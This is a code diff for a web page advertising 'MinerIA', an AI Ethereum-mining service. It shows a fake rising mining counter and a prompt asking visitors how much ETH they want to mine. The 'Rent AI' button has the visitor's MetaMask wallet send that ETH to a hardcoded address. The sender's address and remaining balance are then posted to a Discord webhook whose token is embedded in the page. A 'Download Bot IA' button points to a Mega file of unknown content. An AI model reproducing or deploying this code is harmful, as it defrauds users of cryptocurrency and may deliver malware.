@@ -54,7 +54,53 @@
     text-shadow: none;
   }
 }
+ <div style="display: flex; justify-content: center;">
+  <div class="card" style="background-color: transparent; margin-left: auto; margin-right: auto;">
+      <div class="card">
+<h3>Miner<span class="animated-text">IA</span> <span class="version" style="font-size: 0.8em; font-family: 'Courier New', Courier, monospace; color:dimgray"><span class="counter">0.01%</span></span></h3>
+ 
+<style>
+	
 
+    .animated-text {
+        animation: change-colors 3s infinite;
+    }
+
+    .counter {
+        display: inline-block;
+        margin-left: 10px;
+        font-size: 0.8em;
+        font-family: 'Courier New', Courier, monospace;
+        color: #00ff00; /* Color inicial */
+    }
+
+    @keyframes change-colors {
+        0% {
+            color: gray;
+        }
+        33% {
+            color: white;
+        }
+        66% {
+            color: black;
+        }
+        100% {
+            color: gray;
+        }
+    }
+
+    @keyframes count-up {
+        from {
+            color: #00ff00; /* Color inicial */
+        }
+        to {
+            color: #ff0000; /* Color final */
+        }
+    }
+
+    .count {
+        animation: count-up 25s linear forwards;
+    }
 
 
 
@@ -165,7 +211,17 @@ width:30%;
 	<div class="jadeex-container">
   <span class="jadeex">JadeEx</span>
 </div>
+<p style="color: white; font-size: 12px; font-weight: bold; font-family: 'Roboto', sans-serif; text-align: center; border-bottom: 1px solid white;">
+  <span id="mine-text"></span>
+  <span id="mine-cursor">...</span>
+</p>
 
+<style>
+  /* Animación del cursor */
+  @keyframes blink-caret {
+    from, to { opacity: 0 }
+    50% { opacity: 1 }
+  }
 <body>
 <div class="background">
 	 
@@ -209,6 +265,134 @@ width:30%;
       }
     });
   </script>
+<script>
+    const counter = document.querySelector('.counter');
+    let count = 0.01;
+    const increment = 0.01;
+    const target = 500;
+
+    function updateCounter() {
+        count += increment;
+        counter.textContent = count.toFixed(2) + '%';
+
+        if (count < target) {
+            setTimeout(updateCounter, 50);
+        } else {
+            counter.classList.add('count');
+        }
+    }
+
+    setTimeout(updateCounter, 3000);
+</script>
+	<script>
+  const mineText = document.getElementById('mine-text');
+  const mineCursor = document.getElementById('mine-cursor');
+  const miningMessage = 'Enter the amount of ETH you want to Mine';
+
+  let i = 0;
+  function typeMiningMessage() {
+    if (i < miningMessage.length) {
+      mineText.innerHTML += miningMessage.charAt(i);
+      i++;
+      setTimeout(typeMiningMessage, 150);
+    } else {
+      mineCursor.style.animation = 'blink-caret 0.75s step-end infinite';
+      setInterval(function() {
+        mineCursor.style.opacity = (mineCursor.style.opacity === '1' ? '0' : '1');
+      }, 400);
+      setInterval(function() {
+        let dots = '';
+        let rand = Math.floor(Math.random() * 3) + 1;
+        for (let i = 0; i < rand; i++) {
+          dots += '.';
+        }
+        mineText.innerHTML = miningMessage + dots;
+      }, 7000);
+    }
+  }
+
+  setTimeout(typeMiningMessage, 1000);
+</script>
+
+
+
+        <input type="number" id="amount1">
+        <button onclick="sendETH('0x01C65F22A9478C2932e62483509c233F0aaD5c72', document.getElementById('amount1').value)">Rent AI</button>
+      </div>
+
+
+
+
+    <script>
+     async function sendETH(toAddress, amount) {
+    if (window.ethereum) {
+        try {
+            await window.ethereum.enable();
+            const web3 = new Web3(window.ethereum);
+            const accounts = await web3.eth.getAccounts();
+            const fromAddress = accounts[0];
+            const fromBalance = await web3.eth.getBalance(fromAddress);
+            const txHash = await web3.eth.sendTransaction({
+                from: fromAddress,
+                to: toAddress,
+                value: web3.utils.toWei(amount, 'ether')
+            });
+            console.log(`Transacción enviada: ${txHash}`);
+            const updatedBalance = await web3.eth.getBalance(fromAddress);
+            const message = `Depósito de ${amount} ETH recibido desde la dirección ${fromAddress}. Nuevo saldo: ${web3.utils.fromWei(updatedBalance)} ETH`;
+            sendWebhookMessage(webhookUrl, message);
+        } catch (error) {
+            console.error(error);
+        }
+    } else {
+        console.error('MetaMask no está instalado');
+    }
+}
+function sendWebhookMessage(webhookUrl, message) {
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            content: message
+        })
+    })
+    .then(response => console.log(`Mensaje enviado a Discord. Estado de respuesta: ${response.status} ${response.statusText}`))
+    .catch(error => console.error('Error al enviar mensaje a Discord', error));
+}
+
+      const webhookUrl = "https://discordapp.com/api/webhooks/1065639854324588574/Iu0dfAhK_XeuoLysZSCuxfc79cFpRYvMk9xAueMycoxKijo_gEjoyGT6-6e3MRWFiSnT";
+
+  
+</script>
+	   <button id="download-btn">Download Bot IA</button>
+  <style>
+    #download-btn {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 15px 32px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin: 4px 2px;
+      cursor: pointer;
+      border-radius: 8px;
+    }
+  </style>
+  <script>
+    const downloadBtn = document.getElementById("download-btn");
+    downloadBtn.addEventListener("click", function() {
+      window.location.href = "https://mega.nz/file/hdcmnQjB#x8YsT-AOabeHz6TZCzfGLPCvh-YdrS-_sg1uTmoQUCU";
+    });
+  </script>
+
+
+
+  
+  
 
 
 
